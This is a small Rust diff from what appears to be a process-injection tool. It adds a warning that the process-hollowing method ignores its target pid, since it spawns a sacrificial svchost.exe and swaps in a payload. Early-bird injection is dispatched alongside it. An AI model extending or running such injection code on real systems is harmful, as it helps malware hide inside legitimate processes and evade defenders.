@@ -36,7 +36,13 @@ pub fn inject_with_method(method: InjectionMethod, pid: u32, payload: &[u8]) -> 
         InjectionMethod::EarlyBird => early_bird::EarlyBirdInjector.inject(pid, payload),
         InjectionMethod::Hollowing => {
             // True process hollowing: spawn a sacrificial svchost.exe and replace its image.
-            // The PID parameter is unused; hollowing creates its own host process.
+            // The `pid` parameter is intentionally ignored; hollowing creates its own host.
+            if pid != 0 {
+                log::warn!(
+                    "InjectionMethod::Hollowing ignores the target pid ({pid}); \
+                     it always creates a new sacrificial process."
+                );
+            }
             let _ = pid;
             hollowing::hollow_and_execute(payload).map_err(|e| anyhow::anyhow!("{}", e))
         }
